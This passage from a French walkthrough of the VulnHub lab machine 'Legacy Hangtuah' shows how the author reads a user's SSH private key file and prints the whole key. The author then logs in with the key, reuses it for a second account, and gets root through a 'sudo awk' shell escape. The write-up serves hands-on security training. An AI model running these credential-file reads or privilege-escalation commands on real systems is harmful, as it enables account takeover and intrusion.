builtin class-name\">echo</span> <span class=\"token string\">'/home/pendekar/.ssh/id_rsa'</span> <span class=\"token operator\">></span> official_letter.txt\n<span class=\"token operator\">&lt;</span> <span class=\"token string\">'/home/pendekar/.ssh/id_rsa'</span> <span class=\"token operator\">></span> official_letter.txt\n$ <span class=\"token function\">cat</span> official_letter.txt\n/home/pendekar/.ssh/id_rsa</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Et si on retourne dans le seul fichier que l'on a pu ouvrir.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> /home/pendekar/send_letter.txt\n-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On obtient la clef de l'utilisateur \"pendekar\" que l'on stocke dans un fichier nommé \"pem\" sur la machine attaquante.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">'contenu de la clef'</span> <span class=\"token operator\">></span> pem\n$ <span class=\"token function\">chmod</span> <span class=\"token number\">666</span>\n$ <span class=\"token function\">ssh</span> -i pem pendekar@<span class=\"token variable\">$IP</span>\n$ <span class=\"token function\">id</span>\n<span class=\"token assign-left variable\">uid</span><span class=\"token operator\">=</span><span class=\"token number\">1001</span><span class=\"token punctuation\">(</span>pendekar<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">gid</span><span class=\"token operator\">=</span><span class=\"token number\">1001</span><span class=\"token punctuation\">(</span>pendekar<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">groups</span><span class=\"token operator\">=</span><span class=\"token number\">1001</span><span class=\"token punctuation\">(</span>pendekar<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On trouve le flag user dans le répertoire de l'utilisateur (\"/home/pendekar\").</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> user.txt\n1970fa17c52fdf2ff1d5da9af96733b2</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Puis un fichier d'instruction dans le répertoire de l'autre utilisateur \"hangtuah\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token builtin class-name\">cd</span> /home/hangtuah\n$ <span class=\"token function\">cat</span> lastnotes.txt\nI have been waiting <span class=\"token keyword\">for</span> you pendekar<span class=\"token punctuation\">..</span> I <span class=\"token keyword\">do</span> not have enough time.\nMany people looking <span class=\"token keyword\">for</span> me there is no <span class=\"token function\">more</span> hope <span class=\"token keyword\">for</span> <span class=\"token for-or-select variable\">me</span> <span class=\"token keyword\">in</span> here.\nI know you are the best one to secure this palace instead of me.\nI need to go now somewhere very far and I hope we will meet soon<span class=\"token punctuation\">..</span>.\n\n<span class=\"token punctuation\">..</span>\n--. <span class=\"token punctuation\">..</span> <span class=\"token punctuation\">..</span>.- <span class=\"token builtin class-name\">.</span>\n-.-- --- <span class=\"token punctuation\">..</span>-\n.--. <span class=\"token builtin class-name\">.</span> .-. -- <span class=\"token punctuation\">..</span> <span class=\"token punctuation\">..</span>. <span class=\"token punctuation\">..</span>. <span class=\"token punctuation\">..</span> --- -.\n.- .-<span class=\"token punctuation\">..</span> .-. <span class=\"token builtin class-name\">.</span> .- -<span class=\"token punctuation\">..</span> -.-- .-.-.- .-.-.- .-.-.-\n- <span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span> <span class=\"token builtin class-name\">.</span>\n.-<span class=\"token punctuation\">..</span>-. -.- <span class=\"token builtin class-name\">.</span> -.-- .-<span class=\"token punctuation\">..</span>-. .-.-.- .-.-.- .-.-.-\n-.-- --- <span class=\"token punctuation\">..</span>-\n-.- -. --- .--\n.-- <span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span> .- -\n<span class=\"token punctuation\">..</span>\n-- <span class=\"token builtin class-name\">.</span> .- -.\n-<span class=\"token punctuation\">..</span>. <span class=\"token builtin class-name\">.</span> -.-. .- <span class=\"token punctuation\">..</span>- <span class=\"token punctuation\">..</span>. <span class=\"token builtin class-name\">.</span>\n-.-- --- <span class=\"token punctuation\">..</span>-\n.- .-. <span class=\"token builtin class-name\">.</span>\n.--. <span class=\"token builtin class-name\">.</span> -. -<span class=\"token punctuation\">..</span> <span class=\"token builtin class-name\">.</span> -.- .- .-. -.-.--\n\n-<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>-\n<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span> .- -. --. - <span class=\"token punctuation\">..</span>- .- <span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>La seconde partie ressemble à du langage morse. Sur le site <a href=\"https://www.dcode.fr/code-morse\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://www.dcode.fr</a> avec l'option cochée \"Prendre pour court et long ces deux caractères\", on trouve <code class=\"language-text\">IGIVEYOUPERMISSIONALREADY...THE&quot;KEY&quot;...YOUKNOWWHATIMEANBECAUSEYOUAREPENDEKAR!-HANGTUAH</code>.</p>\n<p>Apparement, la clef existante fonctionnerait avec l'autre compte, celui de \"hangtuah\". On se déconnecte de la session <strong>SSH</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token builtin class-name\">exit</span>\n<span class=\"token builtin class-name\">logout</span>\nConnection to <span class=\"token number\">192.168</span>.1.28 closed.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>Pour se connecter avec le nouveau compte.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">ssh</span> -i pem hangtuah@<span class=\"token variable\">$IP</span>\n$ <span class=\"token function\">whoami</span>\nhangtuah</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<h2>Escalation</h2>\n<p>Regardons les privilèges de cet utilisateur.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">sudo</span> -l\nUser hangtuah may run the following commands on legacyhangtuah:\n    <span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> NOPASSWD: /usr/bin/awk</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>Sur <a href=\"https://gtfobins.github.io/gtfobins/awk/#sudo\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">GTOBins</a>, on trouve la commande <code class=\"language-text\">awk</code> pour devenir root.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> <span class=\"token function\">awk</span> <span class=\"token string\">'BEGIN {system(\"/bin/sh\")}'</span>\n$ <span class=\"token function\">whoami</span>\nroot</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>Désormais utilisateur \"root\", on trouve facilement le flag root.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> /root/root.txt\n8840d1ea10bfc55b0e2dd2354524d779</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<h2>Sources</h2>\n<ul>\n<li>Le protocole WebDAV <a href=\"https://fr.wikipedia.org/wiki/WebDAV\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://fr.wikipedia.org/wiki/WebDAV</a> ;</li>\n<li>Comment exploiter WebDAV <a href=\"https://null-byte.wonderhowto.com/how-to/exploit-webdav-server-get-shell-0204718\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://null-byte.wonderhowto.com/how-to/exploit-webdav-server-get-shell-0204718</a>.</li>\n</ul>\n","download":"https://www.vulnhub.com/entry/legacy-hangtuah,539","tags":[{"title":"Pentest","path":"/tag/Pentest/"},{"title":"CTF","path":"/tag/CTF/"}],"timeToRead":15,"parts":[]}},"context":{}}